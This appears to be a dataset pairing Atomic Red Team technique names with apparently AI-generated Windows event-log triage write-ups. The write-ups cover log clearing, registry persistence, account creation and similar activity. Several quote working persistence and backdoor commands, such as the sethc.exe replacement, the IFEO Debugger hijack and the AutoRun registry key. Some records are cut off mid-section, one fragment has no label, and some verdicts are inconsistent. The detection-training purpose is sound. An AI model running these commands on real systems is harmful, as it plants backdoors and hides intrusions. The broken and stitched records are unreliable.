COM Hijacking with RunDLL32 (Local Server Switch),"**Analysis of Provided Windows Event Logs:**

Upon reviewing the provided event logs, several activities appear concerning and could indicate potential malicious behavior:

1. **PowerShell Activity:**
   - An instance of PowerShell executing a script with commands that modify the Windows Registry is noted. The specific command sequence found in the log involves creating registry keys and properties under `HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}` and loading a suspicious DLL file (`ExternalPayloads\T1546.015_calc.dll`). The use of `Start-Process` with `RUNDLL32.EXE` to execute a DLL via a `-localserver` argument is particularly suspicious and indicative of code execution techniques often used in attacks.

2. **Event Log Tampering:**
   - Logs reveal instances of log file clearing activities. Specifically, the security log (Event ID 1102) and system log (Event ID 104) were cleared by the user `admin_test`. The clearing of event logs, especially without a legitimate reason like audit log maintenance, is a red flag for malicious activity as it can be an indicator of an attempt to cover tracks.

3. **Suspicious Processes:**
   - The use of legitimate Windows tools such as `wevtutil.exe` and `conhost.exe` in proximity to PowerShell execution and log clearing activities is typical in attack scenarios where these tools are leveraged by adversaries to manipulate the system or obfuscate activities.

4. **Indicators of Compromise:**
   - The command sequence and registry modifications align with tactics outlined in MITRE ATT&CK, specifically T1546.015, which is related to event triggering and hook abuse.

5. **Potential Continuation of Process Execution:**
   - The logs include multiple instances of Microsoft Edge Update processes that are benign but should be reviewed to ensure they are genuine and not being used as a cover for malicious activity. In this context, they seem unrelated to the suspicious activities but warrant validation against known trusted activities.

**Assessment:**
Based on the analysis, the logs indicate the presence of potentially **MALICIOUS** activity. The combination of suspicious PowerShell executions that modify registry settings, clear logs, and the use of DLLs is concerning. Additionally, the activities occur under a user account (`admin_test`) that performs actions like script execution and logs clearance without clear, legitimate reasons.

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further spread or communication with potential external control points.
   - Perform a thorough forensic analysis of the system to understand the full scope of the compromise.
   - Analyze the DLL (`T1546.015_calc.dll`) and any artifacts left on the system for further Indicators of Compromise (IOCs).

2. **Review and Remediation:**
   - Ensure PowerShell logging is enabled and retained to catch similar future activities.
   - Improve account security, particularly for elevated users such as `admin_test`, ensuring strong passwords and MFA where possible.
   - Regularly audit and review event logs to spot anomalies early.

3. **Long-term Solutions:**
   - Update and patch systems with the latest security updates.
   - Conduct security awareness training for users, emphasizing the dangers of suspicious scripts and the importance of log integrity. 

Given these indicators and actions, further investigation and comprehensive incident response are advised to secure the environment against potential threats."
IFEO Global Flags,"Upon analyzing the provided Windows event logs, several activities warrant attention. Here are the key observations:

1. **Log Clearing:**
   - Multiple log clearing events are recorded (Event ID 104 and 1102) across the ""System,"" ""Windows PowerShell,"" and ""Security"" channels, performed by a user identified as ""admin_test."" The use of `wevtutil.exe` to clear logs, especially when executed by an administrative account, is a potential indicator of malicious activity, as attackers often clear logs to hide their tracks.

2. **Suspicious Command Execution:**
   - The execution of command `cmd.exe` with parameters indicating registry modification (adding ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"") suggests an attempt to modify registry settings potentially used to execute malicious payloads through legitimate processes (Hijack/Redirect Execution).

3. **Privilege Use and Process Execution:**
   - High-integrity process execution by ""admin_test,"" including the use of `wsmprovhost.exe` (often associated with Windows Remote Management), followed by the execution of `cmd.exe`, `reg.exe`, and `whoami.exe`, suggests activity that is consistent with post-exploitation behavior.

These log activities suggest signs of potential compromise:

- Log files cleared deliberately indicate an attempt to erase forensic evidence.
- Registry modifications carried out through command line operations suggest registry persistence techniques often used in malware or by attackers to maintain presence or divert legitimate actions.

### Resolution:
Based on the detailed logs and suspicious activities identified, including log clearing, unusual processes, and command execution, the appropriate resolution is:

- **MALICIOUS**: The logs contain activity patterns typical of malicious intent and suggest potential compromise. Immediate response actions are necessary.

### Recommendations for Further Action:
1. **Immediate Containment and Investigation:**
   - Isolate the affected system to prevent further potential malicious activity.
   - Perform a detailed forensic analysis on the system to identify any additional signs of compromise or malware persistence mechanisms.

2. **Review Access and Policy Configurations:**
   - Identify how the ""admin_test"" account was used for these activities; check for any unauthorized use or credentials compromise.
   - Ensure log retention policies and monitoring alerts are in place for administrative activity and log clearing events.

3. **Strengthen Security Controls:**
   - Implement additional monitoring of registry changes and process creation events, particularly looking for unusual command-line executions.
   - Strengthen user account policies, potentially introducing multi-factor authentication to the system.

4. **Communication and Reporting:**
   - Communicate the findings to the relevant stakeholders and initiate a comprehensive review and remediation plan for any additional security measures needed across the affected environment."
Bits download using desktopimgdownldr.exe (cmd),"**Analysis of Windows Event Logs:**

1. **Log Clearing Activity:**
   - The logs indicate that the event logs for Security, System, and Windows PowerShell channels were cleared (EventID 1102 in Security Log and EventID 104 in System Log). This action was performed by the user ""SERVER002\\admin_test"" using the `wevtutil.exe` utility, which is a legitimate Windows tool.
   - The clearing of these logs is highly suspicious, as it is often used by malicious actors to cover their tracks following unauthorized or nefarious activities.

2. **Process Execution:**
   - Frequent execution of `wevtutil.exe` with the command line arguments for clearing logs is observed: `cl Security`, `cl System`, and `cl ""Windows PowerShell""`. This is done within a very short timeframe, further suggesting the intent to erase event history.
   - A suspicious command-line execution for `cmd.exe` is noted, involving `desktopimgdownldr.exe` with a URL pointing to a GitHub repository. This command set the `SYSTEMROOT` environment variable to a temporary directory and attempted downloading potentially unauthorized content. This behavior can be associated with a tactics, techniques, and procedures (TTP) often used in attacks to execute non-standard code or downloads.

3. **Unusual Command Line Arguments:**
   - The execution of the above-mentioned `cmd.exe` commands with setting SYSTEMROOT and utilizing URLs is not typical for regular processes and indicates potential malicious activity trying to execute or download unexpected content.

4. **Software Updates:**
   - Several Microsoft Edge Update-related processes are observed. These appear to be legitimate update processes executed by `NT AUTHORITY\\SYSTEM` which is typical for system-level update activities. However, they coincide with the malicious entries, which could be used to camouflage other malicious actions in the logs.

5. **Behavior of High Concern:**
   - The combination of clearing event logs and suspicious command-line execution like using script-based attacks indicates potential compromise or malicious activity.

**Assessment and Recommendations:**

- **Assessment:** The log entries suggest SUSPICIOUS activity due to the clearing of logs and unusual command executions attempting to fetch and run potentially untrusted scripts from the internet.
  
- **Recommendations for Next Steps:**
  - Initiate a detailed forensic analysis on the host to ensure it hasn't been compromised and assess the full impact.
  - Review user credentials and access logs associated with `admin_test` to determine if an unauthorized party gained access.
  - Monitor for any signs of lateral movement or exfiltration of data from the host.
  - Update antivirus and endpoint detection and response (EDR) solutions, conduct a thorough scan for any known malware linked to GitHub-hosted scripts.
  - Evaluate network logs for unusual traffic patterns that might align with the suspicious log activities.

The activities necessitate further investigation but are not conclusively indicative of MALICIOUS behavior without more evidence. However, the indicators suggest that further probing and caution are warranted."
Set Arbitrary Binary as Screensaver,"### Detailed Analysis of Logs:

1. **System Log:**
   - **Log Clearing Events (Event ID 104):** The event logs indicate that both the System and Windows PowerShell event logs were cleared by the user `admin_test` on `SERVER002`. This can be a common tactic to hide other activities and is generally suspicious, especially if there's no legitimate reason provided for the log clearing activity.

2. **Application Log:**
   - The application log simply records an update from the Software Protection Platform Service, which appears benign and typical for system operations.

3. **Sysmon Log:**
   - **Microsoft Edge Update Executions (Event ID 1):** Multiple executions of `MicrosoftEdgeUpdateComRegisterShell64.exe` under `NT AUTHORITY\SYSTEM` appear normal as these are legitimate update processes. However, the sheer volume and sequence of updates should be reviewed in the context of frequency and timing, although they do not inherently appear malicious.
   - **Suspicious CMD Execution:**
     - At `2024-10-27 13:29:55`, `cmd.exe` ran with a command line containing suspicious operations such as the creation and installation of a screensaver under the name `evilscreensaver.scr`. The command involves registry modifications to set this screensaver and configure it to be insecure. This is a strong indicator of malicious behavior.
   - **Reg.exe Operations:**
     - The Sysmon log records several operations using `reg.exe` that align with attempts to modify desktop settings programmatically (specifically screensaver settings)—a part of the suspicious activity perhaps triggered by the aforementioned `cmd.exe`.

4. **Security Log:**
   - **Logon and Privilege Use (Event IDs 4624, 4634, 4672):** The user `admin_test` logged on with privileges that include `SeDebugPrivilege`, `SeBackupPrivilege`, and others, which are high-level privileges vulnerable to abuse if misused.
   - **Event Log Cleared (Event ID 1102):** `admin_test` cleared the Security log shortly after performing numerous operations, which is highly indicative of an attempt to cover tracks.

### Assessment:

There are multiple indicators of compromise, predominantly surrounding the suspicious `cmd.exe` use leading to registry alterations for screensaver settings. Log clearing activities, particularly the clearing of Security logs, further suggest malicious intent by the user `admin_test`.

### Conclusion: MALICIOUS

The evidence strongly indicates malicious activity due to:
- Log clearing, a typical method to hide unauthorized activities.
- Execution of commands modifying critical settings and introducing potentially harmful activity through Windows Registry without legitimate context.
  
### Guidance on How to Proceed:
- **Immediate Containment:** Isolate the affected host (`SERVER002`) from the network to prevent further malicious spreading.
- **Review User Activity:** Investigate `admin_test` credentials for unusual access patterns or external compromise.
- **Forensic Analysis:** Conduct a deeper forensic analysis on `SERVER002` to trace back any other potential malicious software or vulnerabilities exploited.
- **Audit and Revocation:** Review and possibly revoke existing privileges of `admin_test` as a precaution against misuse.
- **Strengthen Monitoring:** Implement advanced threat detection on key servers to identify anomalous activities and unauthorized log clearing attempts."
Persistence using automatic execution of custom DLL during RDP session,"Upon analyzing the provided logs, the following observations and suspicious activities have been identified:

1. **Event Log Clearing:**
   - Several log events across Security, System, and Windows PowerShell channels indicate that logs were cleared using `wevtutil.exe`. Events with IDs 1102 (Security), 104 (System), and Sysmon events showing wevtutil executions suggest an intentional attempt to cover tracks. This action is typically associated with malicious activity, especially when done in conjunction with sensitive operations or privilege escalation.

2. **Unauthorized Privilege Elevation:**
   - Event ID 4672 indicates that the user `admin_test` was granted multiple high-level privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others that are often exploited during privilege escalation activities. These privilege grants warrant further investigation to determine if they were legitimate or abused for malicious purposes.

3. **Suspicious Command Execution:**
   - A Sysmon event records the execution of `cmd.exe` with a registry manipulation command (`reg add ...`) related to `amsi.dll`. The addition or modification of registry entries in such a context can be a method to interfere with system defenses, specifically targeting AMSI (Antimalware Scan Interface), which points towards potential malware activity.

4. **Abnormal System Time Change:**
   - An event in the system logs shows a time change operation by `svchost.exe`. Although this can happen due to legitimate reasons, it is suspicious in the context of other activities taking place concurrently.

5. **Windows Processes Execution:**
   - Multiple executions of console processes (`conhost.exe`) paired with typical utility programs (`whoami.exe`, `hostname.exe`) suggest possible diagnostic or enumeration activity, often a precursor or part of malicious operations.

**Assessment and Conclusion:**
The convergence of multiple suspicious events, such as the clearing of logs, elevated privileges, suspicious command executions altering the registry, and coupled with defensive evasion tactics, strongly indicate that malicious activities are taking place.

**Resolution: MALICIOUS**
The logs contain clear indicators of a potential compromise. Immediate containment actions are recommended, including isolating the host for detailed forensic analysis, reviewing the user account `admin_test` for unauthorized access, and identifying any further persistence mechanisms possibly established during the incident. Additionally, a full review of user activity along with a security audit of all elevated privileges is advisable."

Create a new Windows admin user,"Upon reviewing the provided event logs, several suspicious activities are observed, particularly involving the account named `admin_test` on the computer `Server002`. The logs indicate potential malicious activity. Key observations include:

1. **Event Log Clearing**:
   - Security Event ID 1102: Indicates that the security log was cleared by the user `admin_test`. This action is commonly associated with attempts to cover up malicious activities.

2. **Suspicious Account Creation & Privilege Escalation**:
   - Security Events 4720 and 4728: A new user account named `T1136.001_Admin` was created and immediately added to the administrators group. The rapid sequence of creating a user and assigning administrative privileges without further legitimate context is highly suspicious and often indicative of privilege escalation by a malicious actor.

3. **Use of System Utilities**:
   - Sysmon logs show executions of `cmd.exe` with command lines involved in creating user accounts and modifying group memberships. Specifically, commands like `net user /add` and `net localgroup administrators /add` were executed under `admin_test`'s context.
   - These executions denote the manipulation of user accounts and privileges usually associated with attempts to establish persistence or escalate privileges on a compromised host.

4. **Execution from `admin_test` Account**:
   - The same user `admin_test` initiated multiple executions of sensitive system utilities (like `wevtutil.exe`). Though `wevtutil.exe` itself can be used for legitimate tasks (e.g., managing event logs), its association with log clearance enhances suspicion when viewed collectively.

5. **Common Malicious Patterns**:
   - The pattern of rapid successive system commands executing under the same administrative account within a short timeframe heavily suggests automated or scripted malicious actions.

Based on these findings, the behavior observed in the logs is consistent with tactics, techniques, and procedures (TTPs) associated with malicious actors, particularly involving privilege escalation and log tampering/clearing.

**Resolution**: MALICIOUS

**Guidance**:
- Immediately isolate the host `Server002` from the network to contain potential spread or communication.
- Conduct a forensic investigation on `Server002` to comprehensively assess the system state and identify additional indicators of compromise.
- Review other systems for similar activities linked with the `admin_test` account or the new suspicious account `T1136.001_Admin`.
- Revoke access and credentials for the compromised `admin_test` account, and remove the `T1136.001_Admin` account.
- Depending on findings, escalate response actions which may involve contacting cybersecurity incident response professionals."
Create a new Domain Account using PowerShell,"### Detailed Log Analysis:

**1. Sysmon Log Analysis:**
   - Multiple executions of `wevtutil.exe` with the `cl` (clear) command on different Windows event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`) all executed by the same user `SERVER002\\admin_test`. This suggests an attempt to clear or hide log evidence, which is commonly associated with malicious activity.
   - An unusual sequence of events where `conhost.exe` instances are frequently observed as child processes of critical commands such as `wevtutil.exe` and `powershell.exe`.
   - The execution of a PowerShell script with a command line intended to create a domain account using specific credentials. The account name `T1136.002_Admin` and bold command usage within PowerShell indicate possible unauthorized account creation. This aligns with MITRE ATT&CK technique T1136.002 (Create Account: Domain Account).

**2. System Log Analysis:**
   - Events showing that several log files (`System`, `Windows PowerShell`) were cleared by the user `admin_test`. Clearing event logs, especially without clear administrative justification, is typically indicative of malicious intent to remove traces of activity.

**3. Security Log Analysis:**
   - The `Security` channel was also cleared by the same user. This is a significant indicator of malicious behavior, especially when combined with other log-clearing operations.

**4. Windows PowerShell Log Analysis:**
   - PowerShell logs confirm the execution of a script to add a new user principal in the directory. This is consistent with an attempt to create a new, potentially unauthorized domain account with elevated privileges.

**5. Application Log Analysis:**
   - Regular operations related to the `Software Protection Platform Service`. This does not directly indicate malicious intent unless correlated with other suspicious activities spreading across logs.

### Assessment:
The collected events strongly suggest coordinated activity from a privileged user `admin_test` with intent to obfuscate or cover tracks, create unauthorized accounts, and manipulate logs, which is usually indicative of a security breach or insider threat.

### Threat or Risk Identified:
- Unauthenticated account creation and extensive log clearing indicate potential data exfiltration, unauthorized data access, or lateral movement preparation.

### Resolution:
- **MALICIOUS** - There is clear evidence of malicious activity involving log tampering and unauthorized account creation.

### Guidance on How to Proceed:
1. **Containment:**
   - Immediately disable the `admin_test` account to prevent further unauthorized actions.
   - Scrutinize other privileged accounts and their recent activities for similar patterns.

Modify Terminal Services DLL Path,"After thoroughly analyzing the Windows event logs provided, several indicators of potentially malicious activities were identified. Below is a detailed breakdown of the suspicious events:

### Security Log:
1. **Event ID 1102** - The security event log was cleared by the user ""admin_test"". Clearing of event logs, especially security logs, is often a sign of malicious activity as it is a common tactic used by attackers to cover their tracks.
   
2. **Event ID 4907** - A modification to the security permissions of ""termsrv.dll"" was made using `powershell.exe`. The change in security descriptors directly to system-critical DLL files is highly suspicious. These types of modifications can lead to privilege escalation or unauthorized use of system services.

### Sysmon Log:
- **Multiple wevtutil.exe Executions**: The `wevtutil.exe` utility was used numerous times to clear logs from different channels (Security, Application, System, and Windows PowerShell). This aligns with an attempt to conceal activity by removing traces from event logs.

- **Event ID 1 (Process Creation)**: A PowerShell script executed commands to modify the access control list (ACL) of `termsrv.dll`, potentially overwriting the file and modifying registry keys related to TermService. The script includes high-risk activities like setting file permissions and registry edits, typically associated with lateral movement or persistence techniques.

### Windows PowerShell Log:
- **Intricate PowerShell Commands**: PowerShell commands are performing unauthorized changes to system DLLs and modifying critical registry settings. The script logic suggests attempts to backdoor TermService, which manages Remote Desktop Services. This activity indicates a high probability of malicious intent.

### System Log:
- Similar to the security logs, system logs were also cleared, which further suggests intentional log tampering to hide illegitimate actions.

### Assessment:
- **Clearing Event Logs**: Both the security and system logs being cleared by the same admin account strongly implies a cover-up following potentially unauthorized access or changes.
- **Unusual PowerShell Activity**: The execution of complex and unauthorized PowerShell scripts performing critical system changes is a red flag for malicious activity.
- **Modification of Critical Files**: Changes to the termsrv.dll file and registry settings without legitimate administrative processes reflect an attempt to either escalate privileges or maintain persistent access to the system.

### Conclusion:
Based on the signs of log tampering, unauthorized file and registry modifications, and the use of PowerShell for these changes—there is enough evidence to label these activities as:
- **MALICIOUS**

### Guidance:
1. **Immediate Actions**:
   - Isolate the affected host from the network to prevent any lateral movement or further compromise.
   - Conduct a forensic analysis to determine the extent of compromise, including checking for additional backdoors or malicious scripts.
   - Initiate a thorough review of user credentials and privileges to ensure no additional unauthorized or compromised accounts exist.

2. **Further Investigation**:
   - Examine network logs and other endpoints for signs of similar unauthorized activities or indicators of a broader network compromise.
   - Review policies around privileged access management and implement stricter monitoring and control around sensitive operations.

3. **Enhancing Security Measures**:
   - Consider deploying advanced threat detection solutions that can identify and alert on unusual PowerShell activity or log clearing attempts.
   - Conduct a full audit of installed software and system configurations to identify any unauthorized changes or vulnerabilities that need addressing. 

These actions will not only contain the existing threat but also strengthen security posture against future incidents."

     - Execution of `cmd.exe` with registry modification command: `REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe"" /v Debugger /d ""C:\Windows\System32\cmd.exe""`. This modification can be a tactic to replace legitimate application functionality with something malicious or to hijack how processes run.
     - This command was executed under the high integrity context of user `admin_test`.

4. **Excessive Use of Built-in Tools**:
   - Frequent use of system utilities like `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and processes related to handling logs at intervals raise concerns, as these are often used in enumeration stages or preparation for further attacks.

5. **Additional Notes**:
   - The execution of legitimate processes from `C:\Windows\System32\` isn’t inherently suspicious; however, the pattern and context in which they are used here (frequently querying user information and modifying registry without clear business justification) supports an inference of possible malicious behavior.

### Assessment and Resolution

Based on the combination of cleared logs, system time changes, and potential misuse of system tools, the overall pattern is highly suggestive of attempts to obfuscate actions on the system, likely for malicious purposes. The evidence points towards an internal user with high permissions (`admin_test`) executing these commands, which is often associated with privilege abuse or compromised credentials.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
1. Immediate containment and response:
   - Isolate the host `Server002` from the network.
   - Revoke or review privileges associated with the user `admin_test`.

2. Conduct a thorough investigation:
   - Review additional logs and system configurations for signs of persistence or further compromise.
   - Check for any unauthorized changes to other critical systems or applications.
   
3. Remediation:
   - Clear and rebuild registry configurations to remove unauthorized changes.
   - Reset credentials associated with compromised accounts.
   - Update and patch systems to mitigate exploited vulnerabilities.

4. Monitoring:
   - Implement enhanced monitoring for unusual activities across the network, focusing on similar patterns and behaviors.
   - Conduct a post-incident review to understand the root cause and improve security posture.

Note: These actions should be a part of the organization’s incident response plan to ensure comprehensive mitigation."
HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"Upon reviewing the provided Windows event logs, several activities and logs warrant further scrutiny and indicate potential suspicious behavior:

1. **Use of PowerShell with Suspicious Command:**
   - The Sysmon logs and PowerShell logs reveal the execution of PowerShell with a command intended to set a registry key for `AutoRun` to execute `notepad.exe`. While `notepad.exe` itself is benign, the manipulation of the `AutoRun` registry is a common persistence technique used by attackers. Here, the executed command:
     ```powershell
     powershell.exe & {$path = ""HKCU:\Software\Microsoft\Command Processor""; if (!(Test-Path -path $path)){New-Item -ItemType Key -Path $path}; New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""}
     ```

2. **Event Log Clearing:**
   - Logs show multiple instances of clearing the event logs. Events with ID 104 in the System and events with ID 1102 in the Security logs indicate that the event logs have been cleared. This action is sometimes a tactic used by attackers to cover their tracks post-compromise.

3. **High Integrity Level Processes:**
   - There are multiple processes spawned with high integrity levels, such as `wevtutil.exe` used to clear logs, which corresponds with the Event Log clearing mentioned above.
   
4. **Abnormal Account Activities:**
   - The logs indicate a potentially privileged account (`SERVER002\admin_test`) executing these actions, which could either indicate misuse by a legitimate user or a compromised account.

5. **Back-to-back Execution of Windows Utilities:**
   - The execution pattern of utilities like `whoami.exe`, `hostname.exe`, and continuous spawning of `conhost.exe` indicates potential reconnaissance and process obfuscation by chaining legitimate tools to evade detection.

**Assessment:**

Given the PowerShell command intended to establish persistence, combined with the clearing of logs that may indicate an attempt to hide illicit activity, these behaviors are concerning. Although the commands alone could have legitimate use cases, the context provided by the event log clearing suggests an attempt to obfuscate activity.

**Threat Level:**
- **Resolution:** SUSPICIOUS

**Guidance:**
- Conduct a deeper investigation into the user account `SERVER002\admin_test` for any signs of compromise.
- Examine other systems for similar patterns indicative of lateral movement.
- Ensure security auditing is enabled and scrutinize logs more frequently to catch potential malicious activities early.
- Consider employing endpoint detection and response (EDR) tools to monitor for suspicious PowerShell execution and registry changes that could indicate persistence attempts.

Immediate attention is required to determine whether this is an insider threat or an external compromise using legitimate credentials."
Create a new user in a command prompt,"Upon analysis of the provided Windows event logs, several indicators suggest potentially malicious activity. Here is a detailed breakdown of the key suspicious events:

1. **Event Log Clearing**:
   - The Security, System, and Windows PowerShell logs were cleared by the user `admin_test`. This is a significant red flag, as clearing event logs is often an attempt to cover tracks post-compromise. Relevant events include Event ID 1102 in the Security log and Event ID 104 in the System log.

2. **Time Manipulation**:
   - The system time was changed slightly, as seen in Event ID 4616, which can be a tactic used to disrupt accurate log time-stamping or circumvent security controls that rely on time synchronizations.

3. **Suspicious Account Activity**:
   - A new user account `T1136.001_CMD` was created using the command line (`cmd.exe /c net user /add`) by `admin_test`, as evidenced in the Sysmon log. The name of the account itself, which seems like an ID or tool output rather than a legitimate user, along with the use of the command line and temporary directories, raises concerns of unauthorized and automated account creation indicative of lateral movement preparation.

4. **Administrative Privileges**:
   - The user `admin_test` was involved in multiple privilege activities, such as assigning advanced privileges and impersonation privileges (Event ID 4672), which might indicate an attempt at privilege escalation or executing tasks requiring elevated permissions.

5. **Process Execution Patterns**:
   - A pattern of process execution with account management tools and commands (`cmd.exe`, `net.exe`, `net1.exe`) followed by log clearing (`wevtutil.exe`) conforms to tactics seen in certain attack methodologies aiming to escalate privileges and obfuscate actions.

Based on the above observations, this series of events strongly implies unauthorized activity. The combination of log clearance, time manipulation, account creations, and privilege elevation attempts by the `admin_test` user supports the hypothesis of a security breach.

**Assessment**: MALICIOUS

**Recommendations**:
- Immediately isolate the affected host from the network to prevent further propagation or data exfiltration.
- Conduct a thorough forensic analysis of the host to understand the full scope of the compromise.
- Review user access rights and consider resetting credentials for compromised accounts.
- Examine other systems for signs of lateral movement or similar actions.
- Restore systems from a clean backup post-analysis and implement enhanced monitoring for early detection of similar activities."
Replace binary of sticky keys,"Based on the provided logs, here's a detailed analysis:

### Suspicious/Anomalous Behavior:
1. **Security Log Clearing (Event ID 1102, Security Log):**
   - A log-clearing event (`EventID 1102`) was detected at `2024-10-27 13:50:24`. This event indicates that the security log was cleared by the user `admin_test`. Clearing event logs can be a sign of an attempt to cover tracks after malicious activity.

2. **Sysmon Logs Related to Wevtutil.exe:**
   - Multiple instances of `wevtutil.exe` execution are recorded in the Sysmon logs (Event ID 1). The command line used suggests the clearing of multiple event logs (`Microsoft-Windows-Sysmon`, `Application`, `System`, and `Security`) by the same user `SERVER002\admin_test`. This activity is unusual and often associated with malicious behavior trying to erase traces of unwanted actions.

3. **Potential Sticky Keys Exploit Using Sethc.exe:**
   - There is a Sysmon event detailing the execution of `cmd.exe` with the following command line: `""cmd.exe"" /c IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE (...) & takeown /F C:\Windows\System32\sethc.exe /A & icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe`. This suggests an attempt at a known exploit where `sethc.exe` (Sticky Keys) is replaced with `cmd.exe` to gain elevated privileges, often used for unauthorized access.

4. **Frequent Edge Update Executions:**
   - Several `MicrosoftEdgeUpdate.exe` executions with varying command lines (indicative of an update process). While this might be standard activity for a legitimate update, the timing amidst log-clearing activity should be noted.

5. **Clearing of System and Windows PowerShell Logs:**
   - Similar log-clearing events (`EventID 104`) were detected for the System and Windows PowerShell logs. This consistency across different logs, combined with the use of `wevtutil.exe`, is highly suggestive of intentional concealment of activities.

### Assessment:
- The combination of multiple event log clearing activities, the execution of `wevtutil.exe` to directly clear logs, and the modification of `sethc.exe` to potentially gain unauthorized access are strong indicators of malicious intent and activity designed to cover tracks.

### Threats/Risks Identified:

WMI Invoke-CimMethod Start Process,"Upon analyzing the provided Windows event logs, I have identified several pieces of suspicious activity that may indicate potential malicious behavior, specifically focusing on access, usage of system utilities, and clearing of log files:

1. **Log Clearing Events**:
   - There are multiple instances of event logs being cleared (Event ID: 1102 for Security log, and Event ID: 104 for System and Windows PowerShell logs) by the user `admin_test`. Log clearing activities, especially when done without a clear operational need, can be a strong indicator of an attempt to cover tracks after potentially malicious actions.

2. **Privilege Escalation and Sensitive Privileges**:
   - Event ID: 4672 logs indicate that the user `admin_test` was granted privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others indicative of a high level of access and control over the system. This raises concerns about potential privilege escalation or unauthorized activities being performed using these privileges.

3. **Unusual Process Execution (Wevtutil)**:
   - The `wevtutil.exe` utility is used multiple times with commands to clear the logs (Security, Application, and Windows PowerShell logs). This action is consistent with steps taken to hide malicious activities.
   
4. **Suspicious PowerShell Activity**:
   - There are instances of PowerShell running with an encoded command that involves creating a CIM session using credentials and launching `calc.exe` on a remote machine (`localhost`). While the command itself seems harmless, the context of execution and the credentials used are suspicious, especially when combined with other activities indicating a potential breach.

5. **Time Synchronization Anomaly**:
   - There is a time discrepancy event where the system time is adjusted (Event ID: 4616 and related Kernel-General events), which might be leveraged to disrupt logs' timelines and complicate forensic analysis.

**Assessment**: 
The combination of log clearing, privilege escalations, and the execution of potentially suspicious PowerShell scripts presents a significant concern and is aligned with patterns typically seen in attack sequences involving privilege escalation and log tampering to cover tracks.

**Resolution**: 
- **MALICIOUS**: The logs exhibit clear indicators of potential compromise, including unauthorized log clearing and potential stealth operations through privilege misuse and suspicious script execution. Immediate action is recommended.

**Guidance**:
- Isolate the affected host (`Server002`) from the network to prevent further potential damage.
- Conduct a comprehensive forensic investigation, including a detailed review of any modifications or creation of batch files, scripts, scheduled tasks, user accounts, and changes in passwords.
- Review the user `admin_test` credentials, recent activity, and any unauthorized accesses.
- Implement stricter access controls, monitoring, and consider enabling advanced logging capabilities to capture detailed activity in the future.
- Prepare for potential incident response and reporting to understand the scope and impact of the compromise."
Create registry persistence via AppCert DLL,"Upon analyzing the provided Sysmon, Security, Windows PowerShell, System, and Application logs, the following points indicate potentially malicious activity:

1. **Use of PowerShell for Suspicious Activity**:
   - There are multiple indications of PowerShell being used to run commands that appear suspicious. Specifically, the use of PowerShell to execute commands that involve copying a DLL file (`AtomicTest.dll`) to a public directory and modifying the registry to add this DLL under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls` is particularly concerning. This is an indication of potential persistence mechanism through registry modification using AppCertDlls.

2. **Clearing of Event Logs**:
   - The event logs show evidence that the Security, PowerShell, and System logs were cleared. This typically indicates an attempt to cover tracks by a malicious actor, who has likely gained elevated privileges, as described in Event ID 1102 in the Security log and Event ID 104 in the System log.

3. **High Integrity Processes**:
   - Various processes, like `wevtutil.exe` for clearing event logs, were executed with high integrity levels by the user `SERVER002\\admin_test`, which implies a user with administrative privileges. Additionally, the suspicious activities appear to be executed under administrative permissions.

4. **Use of DLL and Registry Modification**:
   - The registry modification that references a DLL file can be a technique used for persistence or to inject malicious code into trusted processes. This behavior aligns with tactics used in advanced persistent threat (APT) activities.

5. **Presence of Atomic Red Team Tests**:
   - The presence of files and commands related to ""Atomic Red Team"" suggests this system was potentially used for testing cybersecurity defenses, which often mimics real attack scenarios. However, without proper containment or attribution to authorized testing, these actions can be considered malicious.

Based on these observations, the activities identified in the logs are consistent with known malicious behaviors, including unauthorized privilege escalation, persistence through registry modification, and attempted log forgery or deletion. These activities necessitate immediate response actions, such as containment, further investigative steps to verify scope and impact, and initiation of incident response procedures.

**Resolution: MALICIOUS - due to the clear indicators of compromise involving unauthorized registry changes, use of suspicious PowerShell commands for possible persistence, and event log clearance which suggests malicious intent.**

**Next Steps**:
- Initiate an incident response plan immediately.
- Isolate the affected system (Server002) to prevent further spread or damage.
- Conduct a full forensic investigation to identify further evidence of compromise.
- Review user access logs to determine if any unauthorized access was gained.
- Restore system logs if possible and enhance logging capabilities to capture more detailed information.
- Notify relevant stakeholders and follow through with remediation steps, including closing privilege escalation vulnerabilities."
Persistence via WMI Event Subscription - CommandLineEventConsumer,"Upon reviewing the logs provided, several pieces of information can be extracted that point to potential suspicious activities:

1. **Event Log Clearing:**
   - The event logs indicate that system logs, security logs, and PowerShell logs have been cleared using the `wevtutil` utility. This is often a tactic employed by malicious actors to cover their tracks after compromising a system. Specifically, entries in the System and Security logs reveal that a user with the name ""admin_test"" initiated the clearing of logs (`EventID: 104` in System and `EventID: 1102` in Security).

2. **PowerShell Activity:**
   - There are suspicious PowerShell activities logged, where `New-CimInstance` was used to create WMI (Windows Management Instrumentation) persistence mechanisms (`EventID: 600`). The command involves setting up a WMI filter and consumer that could be used to trigger payloads, in this case, `notepad.exe`, upon certain system conditions. This behavior is consistent with known persistence techniques used by attackers to maintain access to a compromised system across reboots.

3. **Process Execution Patterns:**
   - Numerous instances of system utilities (`wevtutil.exe`, `whoami.exe`, `hostname.exe`) running linked to 'admin_test'. While usage of these utilities can be benign, in the context of log clearing and PowerShell WMI persistence, they may be part of an attacker’s toolkit.
   - In the Sysmon logs, several instances of `conhost.exe` and `wevtutil.exe` processes are spawned under the context of the same admin account, suggestive of suspicious scripting or automation.

4. **Privilege Escalation:**
